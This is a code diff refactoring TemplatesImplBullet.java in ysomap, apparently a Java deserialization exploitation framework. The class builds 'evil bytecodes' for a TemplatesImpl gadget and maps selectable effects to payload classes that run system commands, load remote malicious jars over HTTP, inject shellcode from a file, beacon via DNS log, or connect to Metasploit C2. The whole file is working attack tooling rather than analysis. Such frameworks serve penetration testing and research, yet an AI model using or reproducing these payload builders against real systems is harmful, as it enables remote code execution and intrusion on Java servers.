@@ -1,8 +1,6 @@
 package ysomap.bullets.jdk;
 
 
-
-import loader.RemoteFileHttpExecutor;
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
@@ -14,23 +12,18 @@ import echo.SocketEchoPayload;
 import echo.TomcatEchoPayload;
 import javassist.*;
 import loader.*;
-import c2.*;
 import ysomap.bullets.AbstractBullet;
 import ysomap.bullets.Bullet;
 import ysomap.common.annotation.*;
 import ysomap.common.util.Strings;
-import ysomap.core.util.ClassFiles;
-import ysomap.core.util.FileHelper;
-import ysomap.core.util.PayloadHelper;
-import ysomap.core.util.ReflectionHelper;
+import ysomap.core.util.*;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.Serializable;
-import java.nio.file.Files;
-import java.nio.file.Path;
-import java.nio.file.Paths;
 import java.util.Arrays;
+import java.util.HashMap;
+import java.util.Map;
 import java.util.UUID;
 import java.util.zip.GZIPOutputStream;
 
@@ -56,23 +49,14 @@ public class TemplatesImplBullet extends AbstractBullet<Object> {
     private Class transformerFactoryImpl;
 
     @NotNull
-    @Require(name = "type", detail = "5种方式（cmd,code,socket,loader,shellcode）:\n" +
-            "1. cmd，body写入具体的系统命令；\n" +
-            "2. code, body写入具体需要插入执行的代码；\n" +
-            "3. socket, body写入`ip:port`\n" +
-            "4. loader, body写入远程恶意Jar地址，写入格式如 `url;classname` 或 `url;os`\n" +
-            "5. c2, body写入C2相关参数，写入格式如 `path` 或 `url`, 具体查看相关 c2 说明 ")
-    private String type = "cmd";
-
-    @NotNull
-    @Require(name = "body" ,detail = "evil code body")
+    @Require(name = "body" ,detail = DetailHelper.BODY)
     private String body = "";
 
     @NotNull
     @Require(name = "effect", type = "string", detail="选择载入payload的效果，" +
-            "可选default、" +
+            "可选default、SpecialRuntimeExecutor、" +
             "TomcatEcho、SocketEcho、RemoteFileLoader、WinC2Loader、MSFJavaC2Loader、" +
-            "RemoteFileHttpLoader、RemoteFileHttpExecutor、DnslogLoader、RunClassLoader")
+            "RemoteFileHttpLoader、RemoteFileHttpExecutor、DnslogLoader、CustomizableClassLoader")
     private String effect = "default";
 
     @Require(name = "exception", type = "boolean", detail = "是否需要以抛异常的方式返回执行结果，默认为false")
@@ -80,22 +64,13 @@ public class TemplatesImplBullet extends AbstractBullet<Object> {
 
     public String action = "outputProperties";
 
+    private static Map<String, Object[]> effects;
+
     @Override
     public Object getObject() throws Exception {
-        String processedBody = body;
-        if("cmd".equals(type)){
-            if("false".equals(exception)){
-                processedBody = PayloadHelper.makeRuntimeExecPayload(processedBody);
-            }else{
-                processedBody = PayloadHelper.makeExceptionPayload(processedBody);
-            }
-        }else if("code".equals(type) || "socket".equals(type) || "loader".equals(type) || "c2".equals(type)){
-            // do nothing
-        }
-
         initClazz();
         // create evil bytecodes
-        byte[] bytecodes = makeEvilByteCode(processedBody);
+        byte[] bytecodes = makeEvilByteCode(body);
         // arm evil bytecodes
         Object templates = templatesImpl.newInstance();
         // inject class bytes into instance
@@ -109,72 +84,14 @@ public class TemplatesImplBullet extends AbstractBullet<Object> {
         ClassPool pool = new ClassPool(true);
         CtClass cc = null;
         String code = null;
-
-        if("default".equals(effect)){
-            cc = ClassFiles.makeClassFromExistClass(pool,
-                    StubTransletPayload.class,
-                    new Class<?>[]{abstractTranslet}
-            );
-            code = body;
-        }else if("TomcatEcho".equals(effect)){
-            cc = ClassFiles.makeClassFromExistClass(pool,
-                    TomcatEchoPayload.class,
-                    new Class<?>[]{abstractTranslet}
-            );
-            cc.setName("TomcatEcho"+System.currentTimeMillis());
-        }else if("SocketEcho".equals(effect)){
-            String[] remote = body.split(":");
-            code = "host=\""+remote[0]+"\";\nport="+remote[1]+";";
-            pool.appendClassPath(new ClassClassPath(SocketEchoPayload.class));
-            cc = pool.getCtClass(SocketEchoPayload.class.getName());
-            cc.setName("SocketEcho"+System.currentTimeMillis());
-        }else if("RemoteFileLoader".equals(effect)){
-            String[] remote = body.split(";");
-            code = "url=\""+remote[0]+"\";\nclassname=\""+remote[1]+"\";";
-            pool.appendClassPath(new ClassClassPath(RemoteFileLoader.class));
-            cc = pool.getCtClass(RemoteFileLoader.class.getName());
-            cc.setName("Loader"+System.currentTimeMillis());
-        }else if("RemoteFileHttpLoader".equals(effect)){
-            String[] remote = body.split(";");
-            code = "url=\""+remote[0]+"\";\nclassname=\""+remote[1]+"\";";
-            pool.appendClassPath(new ClassClassPath(RemoteFileHttpLoader.class));
-            cc = pool.getCtClass(RemoteFileHttpLoader.class.getName());
-            cc.setName("Loader"+System.currentTimeMillis());
-        }else if("RemoteFileHttpExecutor".equals(effect)){
-            String[] remote = body.split(";");
-            code = "url=\""+remote[0]+"\";\nos=\""+remote[1]+"\";";
-            pool.appendClassPath(new ClassClassPath(RemoteFileHttpExecutor.class));
-            cc = pool.getCtClass(RemoteFileHttpExecutor.class.getName());
-            cc.setName("Loader"+System.currentTimeMillis());
-        }else if("DnslogLoader".equals(effect)){
-            code = "dnslog=\""+body+"\";";
-            pool.appendClassPath(new ClassClassPath(DnslogLoader.class));
-            cc = pool.getCtClass(DnslogLoader.class.getName());
-            cc.setName("Loader"+System.currentTimeMillis());
-        }else if("WinC2Loader".equals(effect)){
-            byte[] shellcode = FileHelper.getFileContent(body);
-            String shellcodeStr = Arrays.toString(shellcode);
-            code = "shellcode = new byte[]{" + shellcodeStr.substring(1, shellcodeStr.length() - 1) +  "};";
-            pool.appendClassPath(new ClassClassPath(WinC2Loader.class));
-            cc = pool.getCtClass(WinC2Loader.class.getName());
-            cc.setName("ShellCode"+System.currentTimeMillis());
-        }else if("MSFJavaC2Loader".equals(effect)){
-            code = "url=\""+body+"\";";
-            pool.appendClassPath(new ClassClassPath(MSFJavaC2Loader.class));
-            cc = pool.getCtClass(MSFJavaC2Loader.class.getName());
-            cc.setName("MSFJavaC2Loader"+System.currentTimeMillis());
-        }else if ("RunClassLoader".equals(effect)){
-            Path path = Paths.get(body);
-            ByteArrayOutputStream outBuf = new ByteArrayOutputStream();
-            GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf);
-            gzipOutputStream.write(Files.readAllBytes(path));
-            gzipOutputStream.close();
-            code = String.format("classBae64Str = \"%s\";", Strings.base64ToString(outBuf.toByteArray()));
-
-            Class targetClass = RunClassLoader.class;
-            pool.appendClassPath(new ClassClassPath(targetClass));
-            cc = pool.getCtClass(targetClass.getName());
-            cc.setName(targetClass.getName()+System.currentTimeMillis());
+        Object[] objs = effects.get(effect);
+        if(objs != null){
+            Class<?> effectClazz = (Class) objs[0];
+            String classname = effectClazz.getSimpleName();
+            code = process((String) objs[1], (String) objs[2], body);
+            pool.appendClassPath(new ClassClassPath(effectClazz));
+            cc = pool.getCtClass(effectClazz.getName());
+            cc.setName(classname+System.currentTimeMillis());
         }
 
         if(cc != null){
@@ -186,6 +103,54 @@ public class TemplatesImplBullet extends AbstractBullet<Object> {
         }else{
             return new byte[0];
         }
+    }
+
+    private String process(String formater, String action, String body) throws IOException {
+        String code = null;
+        if(formater != null){
+            if(action == null){
+                code = String.format(formater, body);
+            }else{
+                String[] actions = action.split(";");
+                Object data = body;
+                for(String act:actions){
+                    data = doAction(act, data);
+                }
+                if(data instanceof String){ // String
+                    code = String.format(formater, data);
+                }else{ // String[]
+                    code = String.format(formater, Arrays.stream(((String[])data)).toArray());
+                }
+            }
+        }
+        return code;
+    }
+
+    public Object doAction(String action, Object data) throws IOException {
+        if("split".equals(action) && data instanceof String){
+            return ((String) data).split(";");
+        }else if("read".equals(action) && data instanceof String){
+            return FileHelper.getFileContent((String) data);
+        }else if("base64".equals(action) && data instanceof byte[]){
+            return Strings.base64ToString((byte[]) data);
+        }else if("gzip".equals(action) && data instanceof byte[]){
+            ByteArrayOutputStream outBuf = new ByteArrayOutputStream();
+            GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf);
+            gzipOutputStream.write((byte[]) data);
+            gzipOutputStream.close();
+            return outBuf.toByteArray();
+        }else if("arrayToString".equals(action) && data instanceof byte[]){
+            return Arrays.toString((byte[]) data)
+                    .replace("[", "")
+                    .replace("]", "");
+        }else if("wrap".equals(action) && data instanceof String){
+            if("false".equals(exception)){
+                return PayloadHelper.makeRuntimeExecPayload((String) data);
+            }else{
+                return PayloadHelper.makeExceptionPayload((String) data);
+            }
+        }
+        return data;
     }
 
     private void initClazz() throws ClassNotFoundException {
@@ -217,10 +182,42 @@ public class TemplatesImplBullet extends AbstractBullet<Object> {
 
     public static Bullet newInstance(Object... args) throws Exception {
         Bullet bullet = new TemplatesImplBullet();
-        bullet.set("type", args[0]);
-        bullet.set("body", args[1]);
-        bullet.set("effect", args[2]);
-        bullet.set("exception", args[3]);
+        bullet.set("body", args[0]);
+        bullet.set("effect", args[1]);
+        bullet.set("exception", args[2]);
         return bullet;
     }
+
+    static {
+        effects = new HashMap<>();
+        effects.put("default", new Object[]{StubTransletPayload.class, "%s", "wrap"});
+        effects.put("TomcatEcho", new Object[]{TomcatEchoPayload.class, null, null});
+        effects.put("SocketEcho",
+                new Object[]{SocketEchoPayload.class,
+                            "host=\"%s\";port=%s;", "split"});
+        effects.put("RemoteFileLoader",
+                new Object[]{RemoteFileLoader.class,
+                            "url=\"%s\";\nclassname=\"%s\";", "split"});
+        effects.put("RemoteFileHttpLoader",
+                new Object[]{RemoteFileHttpLoader.class,
+                            "url=\"%s\";\nclassname=\"%s\";", "split"});
+        effects.put("RemoteFileHttpExecutor",
+                new Object[]{RemoteFileHttpExecutor.class,
+                            "url=\"%s\";\nos=\"%s\";", "split"});
+        effects.put("DnslogLoader",
+                new Object[]{DnslogLoader.class, "dnslog=\"%s\";", null});
+        effects.put("WinC2Loader",
+                new Object[]{WinC2Loader.class,
+                            "shellcode = new byte[]{%s};", "read;arrayToString"});
+        effects.put("MSFJavaC2Loader",
+                new Object[]{MSFJavaC2Loader.class,
+                            "url=\"%s\";", null});
+        effects.put("CustomizableClassLoader",
+                new Object[]{CustomizableClassLoader.class,
+                            "classBae64Str = \"%s\";", "read;gzip;base64"});
+//        effects.put("SpecialRuntimeExecutor",
+//                new Object[]{SpecialRuntimeExecutor.class,
+//                            "command = \"%s\";", null});
+    }
+
 }
